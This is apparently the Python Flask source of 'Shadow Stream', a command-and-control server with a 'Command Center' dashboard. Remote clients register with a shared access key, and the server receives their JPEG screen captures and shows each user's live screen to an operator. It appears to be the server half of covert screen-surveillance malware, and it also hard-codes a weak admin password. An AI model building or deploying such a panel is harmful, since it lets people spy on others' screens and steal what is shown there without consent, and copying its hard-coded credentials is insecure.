from flask import Flask, request, jsonify, render_template, render_template_string, Response, session, redirect, url_for, flash
import secrets
import threading
import time
import uuid
import hashlib
import jwt
from datetime import datetime, timedelta
import logging
import os
from dataclasses import dataclass, asdict
from typing import Dict, Optional
import json
import ssl
import subprocess
import bcrypt
from functools import wraps
import hmac

app = Flask(__name__)

# Enhanced Security Configuration
SECRET_KEY = secrets.token_hex(32)
ACCESS_KEY = "shadowstream_2024_secure"  # Change this for security
TOKEN_EXPIRY_HOURS = 24
SESSION_TIMEOUT_MINUTES = 30

# Admin credentials (In production, store these in a secure database)
ADMIN_USERNAME = "mulware"
ADMIN_PASSWORD_HASH = bcrypt.hashpw("password1234".encode('utf-8'), bcrypt.gensalt())

app.config['SECRET_KEY'] = SECRET_KEY
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True in production with HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # No JS access
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=SESSION_TIMEOUT_MINUTES)

# Global storage for clients and streams
clients: Dict[str, 'ClientInfo'] = {}
streams: Dict[str, bytes] = {}  # client_id -> latest frame
client_lock = threading.Lock()
stream_lock = threading.Lock()

@dataclass
class ClientInfo:
    client_id: str
    username: str
    hostname: str
    token: str
    registered_at: datetime
    last_heartbeat: datetime
    status: str  # 'idle', 'streaming', 'offline'
    system_info: dict
    capabilities: dict
    
    def to_dict(self):
        data = asdict(self)
        data['registered_at'] = self.registered_at.isoformat()
        data['last_heartbeat'] = self.last_heartbeat.isoformat()
        return data
    
    def is_active(self) -> bool:
        return (datetime.now() - self.last_heartbeat).seconds < 120  # 2 minutes timeout

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_token(client_id: str) -> str:
    """Generate JWT token for client authentication"""
    payload = {
        'client_id': client_id,
        'exp': datetime.utcnow() + timedelta(hours=TOKEN_EXPIRY_HOURS),
        'iat': datetime.utcnow()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verify_token(token: str) -> Optional[str]:
    """Verify JWT token and return client_id"""
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload['client_id']
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None

def generate_csrf_token():
    """Generate CSRF token"""
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(16)
    return session['_csrf_token']

def validate_csrf_token(token):
    """Validate CSRF token"""
    return hmac.compare_digest(token, session.get('_csrf_token', ''))

def require_login(f):
    """Decorator to require login for web interface"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return redirect(url_for('login'))
        
        # Check session timeout
        if 'login_time' in session:
            if datetime.now() - datetime.fromisoformat(session['login_time']) > timedelta(minutes=SESSION_TIMEOUT_MINUTES):
                session.clear()
                flash('Session expired. Please login again.', 'warning')
                return redirect(url_for('login'))
        
        return f(*args, **kwargs)
    return decorated_function

def require_auth(f):
    """Decorator to require authentication for API endpoints"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'success': False, 'message': 'Missing or invalid authorization header'}), 401
        
        token = auth_header.split(' ')[1]
        client_id = verify_token(token)
        
        if not client_id:
            return jsonify({'success': False, 'message': 'Invalid or expired token'}), 401
        
        # Check if client exists and is active
        with client_lock:
            if client_id not in clients:
                return jsonify({'success': False, 'message': 'Client not registered'}), 401
        
        request.client_id = client_id
        return f(*args, **kwargs)
    
    return decorated_function

# LOGIN TEMPLATE
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Stream - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glow { box-shadow: 0 0 20px rgba(14, 165, 233, 0.3); }
        .text-glow { text-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
        .bg-matrix {
            background-image: radial-gradient(circle at 1px 1px, rgba(14, 165, 233, 0.1) 1px, transparent 0);
            background-size: 20px 20px;
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen bg-matrix flex items-center justify-center">
    <div class="bg-black bg-opacity-80 backdrop-blur-sm border border-cyan-500 rounded-lg p-8 w-full max-w-md glow">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-glow">
                <span class="text-cyan-400">SHADOW</span>
                <span class="text-green-400">STREAM</span>
            </h1>
            <p class="text-gray-400 mt-2">Command Center Access</p>
        </div>
        
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="mb-4 p-3 rounded-lg {% if category == 'error' %}bg-red-900 border border-red-500 text-red-200{% else %}bg-blue-900 border border-blue-500 text-blue-200{% endif %}">
                        {{ message }}
                    </div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        
        <form method="POST" class="space-y-6">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            
            <div>
                <label for="username" class="block text-sm font-medium text-gray-300 mb-2">Username</label>
                <input type="text" id="username" name="username" required
                       class="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:ring-2 focus:ring-cyan-500 focus:border-transparent text-white">
            </div>
            
            <div>
                <label for="password" class="block text-sm font-medium text-gray-300 mb-2">Password</label>
                <input type="password" id="password" name="password" required
                       class="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:ring-2 focus:ring-cyan-500 focus:border-transparent text-white">
            </div>
            
            <button type="submit" 
                    class="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-medium py-2 px-4 rounded-lg transition-colors duration-200 glow">
                ACCESS SYSTEM
            </button>
        </form>
        
        <div class="mt-6 text-center text-xs text-gray-500">
            Authorized Personnel Only
        </div>
    </div>
</body>
</html>
"""

# Authentication Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    """Secure login page"""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        csrf_token = request.form.get('csrf_token', '')
        
        # Validate CSRF token
        if not validate_csrf_token(csrf_token):
            flash('Invalid security token. Please try again.', 'error')
            return render_template_string(LOGIN_HTML, csrf_token=generate_csrf_token())
        
        # Rate limiting check (simple implementation)
        login_attempts_key = f"login_attempts_{request.remote_addr}"
        if login_attempts_key in session:
            attempts = session[login_attempts_key]
            if attempts >= 5:
                flash('Too many failed attempts. Please try again later.', 'error')
                return render_template_string(LOGIN_HTML, csrf_token=generate_csrf_token())
        
        # Validate credentials
        if username == ADMIN_USERNAME and bcrypt.checkpw(password.encode('utf-8'), ADMIN_PASSWORD_HASH):
            session.permanent = True
            session['logged_in'] = True
            session['username'] = username
            session['login_time'] = datetime.now().isoformat()
            session.pop(login_attempts_key, None)  # Clear failed attempts
            
            logger.info(f"Successful login from {request.remote_addr}")
            return redirect(url_for('dashboard'))
        else:
            # Increment failed attempts
            session[login_attempts_key] = session.get(login_attempts_key, 0) + 1
            logger.warning(f"Failed login attempt from {request.remote_addr} for user: {username}")
            flash('Invalid username or password', 'error')
    
    return render_template_string(LOGIN_HTML, csrf_token=generate_csrf_token())

@app.route('/logout')
@require_login
def logout():
    """Logout and clear session"""
    session.clear()
    flash('You have been logged out successfully', 'info')
    return redirect(url_for('login'))

# Web Interface Routes
@app.route('/')
@require_login
def dashboard():
    """Main dashboard - requires login"""
    return render_template_string(DASHBOARD_HTML, csrf_token=generate_csrf_token())

@app.route('/api/register', methods=['POST'])
def register_client():
    """Register a new client"""
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ['client_id', 'username', 'hostname']
        for field in required_fields:
            if field not in data:
                return jsonify({'success': False, 'message': f'Missing field: {field}'}), 400
        
        # Verify access key
        provided_key = data.get('access_key', '')
        if provided_key != ACCESS_KEY:
            return jsonify({'success': False, 'message': 'Invalid access key'}), 403
        
        client_id = data['client_id']
        
        # Generate authentication token
        token = generate_token(client_id)
        
        # Create client info
        client_info = ClientInfo(
            client_id=client_id,
            username=data['username'],
            hostname=data['hostname'],
            token=token,
            registered_at=datetime.now(),
            last_heartbeat=datetime.now(),
            status='idle',
            system_info=data.get('system_info', {}),
            capabilities=data.get('capabilities', {})
        )
        
        # Store client
        with client_lock:
            clients[client_id] = client_info
        
        logger.info(f"Client registered: {data['username']}@{data['hostname']} ({client_id})")
        
        return jsonify({
            'success': True,
            'message': 'Client registered successfully',
            'token': token,
            'client_id': client_id
        })
        
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'success': False, 'message': 'Registration failed'}), 500

@app.route('/api/unregister', methods=['POST'])
@require_auth
def unregister_client():
    """Unregister a client"""
    try:
        client_id = request.client_id
        
        with client_lock:
            if client_id in clients:
                del clients[client_id]
        
        with stream_lock:
            if client_id in streams:
                del streams[client_id]
        
        logger.info(f"Client unregistered: {client_id}")
        
        return jsonify({'success': True, 'message': 'Client unregistered successfully'})
        
    except Exception as e:
        logger.error(f"Unregistration error: {e}")
        return jsonify({'success': False, 'message': 'Unregistration failed'}), 500

@app.route('/api/heartbeat', methods=['POST'])
@require_auth
def heartbeat():
    """Update client heartbeat"""
    try:
        client_id = request.client_id
        data = request.get_json()
        
        with client_lock:
            if client_id in clients:
                clients[client_id].last_heartbeat = datetime.now()
                clients[client_id].status = data.get('status', 'idle')
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        return jsonify({'success': False, 'message': 'Heartbeat failed'}), 500

@app.route('/api/stream', methods=['POST'])
@require_auth
def receive_stream():
    """Receive screen capture frames from clients"""
    try:
        client_id = request.client_id
        
        # Check if we have image data
        if not request.data:
            return jsonify({'success': False, 'message': 'No data received'}), 400
        
        # Check content type
        content_type = request.headers.get('Content-Type', '')
        if 'image/jpeg' not in content_type:
            return jsonify({'success': False, 'message': 'Invalid content type'}), 400
        
        # Update client status
        with client_lock:
            if client_id in clients:
                clients[client_id].status = 'streaming'
                clients[client_id].last_heartbeat = datetime.now()
        
        # Store frame
        with stream_lock:
            streams[client_id] = request.data
        
        return jsonify({'success': True, 'message': 'Frame received'})
        
    except Exception as e:
        logger.error(f"Stream receive error: {e}")
        return jsonify({'success': False, 'message': 'Stream receive failed'}), 500

@app.route('/api/clients')
@require_login
def get_clients():
    """Get list of registered clients"""
    try:
        with client_lock:
            client_list = []
            for client_id, client_info in clients.items():
                client_data = client_info.to_dict()
                client_data['is_active'] = client_info.is_active()
                
                # Check if client has active stream
                with stream_lock:
                    client_data['has_stream'] = client_id in streams
                
                client_list.append(client_data)
        
        return jsonify({'success': True, 'clients': client_list})
        
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        return jsonify({'success': False, 'message': 'Failed to get clients'}), 500

@app.route('/api/stream/<client_id>')
@require_login
def get_client_stream(client_id):
    """Get latest frame from specific client"""
    try:
        with stream_lock:
            if client_id not in streams:
                return jsonify({'success': False, 'message': 'No stream available'}), 404
            
            frame_data = streams[client_id]
        
        return Response(
            frame_data,
            mimetype='image/jpeg',
            headers={
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            }
        )
        
    except Exception as e:
        logger.error(f"Get stream error: {e}")
        return jsonify({'success': False, 'message': 'Stream retrieval failed'}), 500

@app.route('/api/stats')
@require_login
def get_stats():
    """Get server statistics"""
    try:
        with client_lock:
            total_clients = len(clients)
            active_clients = sum(1 for c in clients.values() if c.is_active())
            streaming_clients = sum(1 for c in clients.values() if c.status == 'streaming')
        
        with stream_lock:
            total_streams = len(streams)
        
        return jsonify({
            'success': True,
            'stats': {
                'total_clients': total_clients,
                'active_clients': active_clients,
                'streaming_clients': streaming_clients,
                'total_streams': total_streams,
                'server_uptime': time.time() - getattr(app, 'start_time', time.time()),
                'timestamp': datetime.now().isoformat()
            }
        })
        
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({'success': False, 'message': 'Stats retrieval failed'}), 500

@app.route('/view/<client_id>')
@require_login
def view_client(client_id):
    """View specific client stream"""
    return render_template_string(VIEWER_HTML, client_id=client_id)

# Dashboard HTML Template
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Stream - Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'cyber': {
                            50: '#f0f9ff',
                            100: '#e0f2fe',
                            200: '#bae6fd',
                            300: '#7dd3fc',
                            400: '#38bdf8',
                            500: '#0ea5e9',
                            600: '#0284c7',
                            700: '#0369a1',
                            800: '#075985',
                            900: '#0c4a6e',
                        }
                    }
                }
            }
        }
    </script>
    <style>
        .glow { box-shadow: 0 0 20px rgba(14, 165, 233, 0.3); }
        .glow-green { box-shadow: 0 0 20px rgba(34, 197, 94, 0.3); }
        .glow-red { box-shadow: 0 0 20px rgba(239, 68, 68, 0.3); }
        .text-glow { text-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite alternate; }
        @keyframes pulse-glow {
            0% { box-shadow: 0 0 5px rgba(14, 165, 233, 0.5); }
            100% { box-shadow: 0 0 20px rgba(14, 165, 233, 0.8); }
        }
        .bg-matrix {
            background-image: radial-gradient(circle at 1px 1px, rgba(14, 165, 233, 0.1) 1px, transparent 0);
            background-size: 20px 20px;
        }
        .terminal {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.7));
            border: 1px solid rgba(14, 165, 233, 0.3);
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen bg-matrix">
    <!-- Header -->
    <header class="bg-black bg-opacity-80 backdrop-blur-sm border-b border-cyber-500 sticky top-0 z-50">
        <div class="container mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-4">
                    <div class="text-2xl font-bold text-glow">
                        <span class="text-cyber-400">SHADOW</span>
                        <span class="text-green-400">STREAM</span>
                    </div>
                    <div class="text-xs text-gray-400 bg-gray-800 px-2 py-1 rounded">
                        COMMAND CENTER
                    </div>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="text-xs text-gray-400">
                        <span id="currentTime"></span>
                    </div>
                    <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <span class="text-xs text-green-400">ONLINE</span>
                </div>
            </div>
        </div>
    </header>

    <div class="container mx-auto px-6 py-8">
        <!-- Stats Dashboard -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <div class="terminal glow rounded-lg p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-sm font-medium text-gray-400">TOTAL CLIENTS</h3>
                    <div class="w-2 h-2 bg-cyber-500 rounded-full animate-pulse"></div>
                </div>
                <div class="text-3xl font-bold text-cyber-400" id="totalClients">0</div>
            </div>
            
            <div class="terminal glow-green rounded-lg p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-sm font-medium text-gray-400">ACTIVE CLIENTS</h3>
                    <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                </div>
                <div class="text-3xl font-bold text-green-400" id="activeClients">0</div>
            </div>
            
            <div class="terminal glow rounded-lg p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-sm font-medium text-gray-400">STREAMING</h3>
                    <div class="w-2 h-2 bg-purple-500 rounded-full animate-pulse"></div>
                </div>
                <div class="text-3xl font-bold text-purple-400" id="streamingClients">0</div>
            </div>
            
            <div class="terminal glow rounded-lg p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-sm font-medium text-gray-400">UPTIME</h3>
                    <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
                </div>
                <div class="text-lg font-bold text-yellow-400" id="uptime">00:00:00</div>
            </div>
        </div>

        <!-- Clients Section -->
        <div class="terminal glow rounded-lg p-6">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-xl font-bold text-glow">CONNECTED CLIENTS</h2>
                <button onclick="refreshClients()" class="bg-cyber-600 hover:bg-cyber-700 px-4 py-2 rounded-lg text-sm font-medium transition-colors duration-200 glow">
                    REFRESH
                </button>
            </div>
            
            <div id="clientsContainer" class="space-y-4">
                <!-- Clients will be populated here -->
            </div>
            
            <div id="noClients" class="text-center py-12 text-gray-500 hidden">
                <div class="text-6xl mb-4">👥</div>
                <div class="text-lg font-medium">No clients connected</div>
                <div class="text-sm">Waiting for clients to register...</div>
            </div>
        </div>
    </div>

    <script>
        let clients = [];
        let refreshInterval;

        // Initialize dashboard
        document.addEventListener('DOMContentLoaded', function() {
            updateTime();
            setInterval(updateTime, 1000);
            refreshClients();
            refreshInterval = setInterval(refreshClients, 2000);
        });

        function updateTime() {
            const now = new Date();
            document.getElementById('currentTime').textContent = now.toLocaleTimeString();
        }

        function formatUptime(seconds) {
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = Math.floor(seconds % 60);
            return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        async function refreshClients() {
            try {
                const response = await fetch('/api/clients');
                const data = await response.json();
                
                if (data.success) {
                    clients = data.clients;
                    updateClientsDisplay();
                    await updateStats();
                }
            } catch (error) {
                console.error('Error fetching clients:', error);
            }
        }

        async function updateStats() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                if (data.success) {
                    const stats = data.stats;
                    document.getElementById('totalClients').textContent = stats.total_clients;
                    document.getElementById('activeClients').textContent = stats.active_clients;
                    document.getElementById('streamingClients').textContent = stats.streaming_clients;
                    document.getElementById('uptime').textContent = formatUptime(stats.server_uptime);
                }
            } catch (error) {
                console.error('Error fetching stats:', error);
            }
        }

        function updateClientsDisplay() {
            const container = document.getElementById('clientsContainer');
            const noClients = document.getElementById('noClients');
            
            if (clients.length === 0) {
                container.innerHTML = '';
                noClients.classList.remove('hidden');
                return;
            }
            
            noClients.classList.add('hidden');
            
            container.innerHTML = clients.map(client => {
                const statusColor = client.is_active ? 
                    (client.status === 'streaming' ? 'text-purple-400' : 'text-green-400') : 
                    'text-red-400';
                
                const statusText = client.is_active ? 
                    (client.status === 'streaming' ? 'STREAMING' : 'ACTIVE') : 
                    'OFFLINE';
                
                const glowClass = client.is_active ? 
                    (client.status === 'streaming' ? 'animate-pulse-glow' : 'glow-green') : 
                    'glow-red';
                
                return `
                    <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 border border-gray-700 ${glowClass}">
                        <div class="flex items-center justify-between">
                            <div class="flex items-center space-x-4">
                                <div class="w-12 h-12 bg-gray-700 rounded-lg flex items-center justify-center">
                                    <span class="text-xl">🖥️</span>
                                </div>
                                <div>
                                    <div class="font-medium text-white">${client.username}@${client.hostname}</div>
                                    <div class="text-sm text-gray-400">ID: ${client.client_id.substring(0, 8)}...</div>
                                    <div class="text-xs ${statusColor} font-medium">${statusText}</div>
                                </div>
                            </div>
                            
                            <div class="flex items-center space-x-2">
                                ${client.has_stream ? `
                                    <button onclick="viewStream('${client.client_id}')" 
                                            class="bg-purple-600 hover:bg-purple-700 text-white px-3 py-2 rounded-lg text-sm font-medium transition-colors duration-200 flex items-center space-x-2">
                                        <span>👁️</span>
                                        <span>VIEW</span>
                                    </button>
                                ` : `
                                    <button disabled class="bg-gray-600 text-gray-400 px-3 py-2 rounded-lg text-sm font-medium cursor-not-allowed">
                                        NO STREAM
                                    </button>
                                `}
                                
                                <div class="text-right text-xs text-gray-400">
                                    <div>Registered: ${new Date(client.registered_at).toLocaleString()}</div>
                                    <div>Last Seen: ${new Date(client.last_heartbeat).toLocaleString()}</div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function viewStream(clientId) {
            window.open(`/view/${clientId}`, '_blank');
        }
    </script>
</body>
</html>
"""

# Viewer HTML Template
VIEWER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Stream - Viewer</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glow { box-shadow: 0 0 20px rgba(14, 165, 233, 0.3); }
        .text-glow { text-shadow: 0 0 10px rgba(14, 165, 233, 0.5); }
        .bg-matrix {
            background-image: radial-gradient(circle at 1px 1px, rgba(14, 165, 233, 0.1) 1px, transparent 0);
            background-size: 20px 20px;
        }
        .terminal {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.7));
            border: 1px solid rgba(14, 165, 233, 0.3);
        }
        #streamImage {
            max-width: 100%;
            height: auto;
            border: 2px solid rgba(14, 165, 233, 0.5);
            border-radius: 8px;
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen bg-matrix">
    <header class="bg-black bg-opacity-80 backdrop-blur-sm border-b border-cyan-500 p-4">
        <div class="flex items-center justify-between">
            <div class="flex items-center space-x-4">
                <button onclick="window.close()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-sm">
                    ← CLOSE
                </button>
                <h1 class="text-xl font-bold text-glow">STREAM VIEWER</h1>
                <div class="text-sm text-gray-400">Client: {{ client_id }}</div>
            </div>
            <div class="flex items-center space-x-4">
                <button onclick="toggleFullscreen()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm">
                    FULLSCREEN
                </button>
                <div id="status" class="text-sm text-green-400">CONNECTING...</div>
            </div>
        </div>
    </header>

    <div class="container mx-auto p-6">
        <div class="terminal glow rounded-lg p-6">
            <div class="flex justify-center">
                <img id="streamImage" src="" alt="Client Stream" style="display: none;">
                <div id="noStream" class="text-center py-12 text-gray-500">
                    <div class="text-6xl mb-4">📺</div>
                    <div class="text-lg font-medium">Waiting for stream...</div>
                    <div class="text-sm">Make sure the client is actively streaming</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const clientId = '{{ client_id }}';
        let streamInterval;
        let frameCount = 0;

        document.addEventListener('DOMContentLoaded', function() {
            startStream();
        });

        function startStream() {
            streamInterval = setInterval(fetchFrame, 100);
        }

        async function fetchFrame() {
            try {
                const response = await fetch(`/api/stream/${clientId}`);
                
                if (response.ok) {
                    const blob = await response.blob();
                    const imageUrl = URL.createObjectURL(blob);
                    
                    const img = document.getElementById('streamImage');
                    const noStream = document.getElementById('noStream');
                    
                    img.src = imageUrl;
                    img.style.display = 'block';
                    noStream.style.display = 'none';
                    
                    frameCount++;
                    document.getElementById('status').textContent = `STREAMING (${frameCount} frames)`;
                    
                    setTimeout(() => URL.revokeObjectURL(imageUrl), 1000);
                } else {
                    document.getElementById('status').textContent = 'NO STREAM AVAILABLE';
                }
            } catch (error) {
                console.error('Stream error:', error);
                document.getElementById('status').textContent = 'CONNECTION ERROR';
            }
        }

        function toggleFullscreen() {
            const img = document.getElementById('streamImage');
            if (document.fullscreenElement) {
                document.exitFullscreen();
            } else {
                img.requestFullscreen().catch(err => {
                    console.error('Fullscreen error:', err);
                });
            }
        }
    </script>
</body>
</html>
"""

# Cleanup thread to remove inactive clients
def cleanup_inactive_clients():
    """Remove clients that haven't sent heartbeat in a while"""
    while True:
        try:
            time.sleep(60)  # Check every minute
            
            current_time = datetime.now()
            inactive_clients = []
            
            with client_lock:
                for client_id, client_info in clients.items():
                    if (current_time - client_info.last_heartbeat).seconds > 300:  # 5 minutes
                        inactive_clients.append(client_id)
            
            # Remove inactive clients
            for client_id in inactive_clients:
                with client_lock:
                    if client_id in clients:
                        logger.info(f"Removing inactive client: {client_id}")
                        del clients[client_id]
                
                with stream_lock:
                    if client_id in streams:
                        del streams[client_id]
                        
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

def create_ssl_context():
    """Create SSL context for HTTPS"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    
    try:
        context.load_cert_chain('cert.pem', 'key.pem')
        logger.info("Loaded SSL certificates from cert.pem and key.pem")
    except FileNotFoundError:
        logger.warning("SSL certificate files not found. Generating self-signed certificate...")
        
        if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
            try:
                # Generate self-signed certificate
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                    '-keyout', 'key.pem', '-out', 'cert.pem',
                    '-days', '365', '-nodes',
                    '-subj', '/C=US/ST=State/L=City/O=Organization/CN=localhost'
                ], check=True)
                logger.info("Generated self-signed certificate")
                context.load_cert_chain('cert.pem', 'key.pem')
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.error("Could not generate SSL certificate. OpenSSL not found or failed.")
                logger.info("Running without SSL (HTTP only)")
                return None
    
    return context

if __name__ == '__main__':
    import sys

   
    try:
        app.start_time = time.time()

        # Start cleanup thread
        cleanup_thread = threading.Thread(target=cleanup_inactive_clients, daemon=True)
        cleanup_thread.start()

        app.run(host='0.0.0.0', port=8000, debug=False, ssl_context=('cert.pem', 'key.pem'))

    except KeyboardInterrupt:
        logger.info("Server shutdown requested")

    except Exception as e:
        logger.error(f"Server error: {e}")

    finally:
        logger.info("Shadow Stream Server stopped")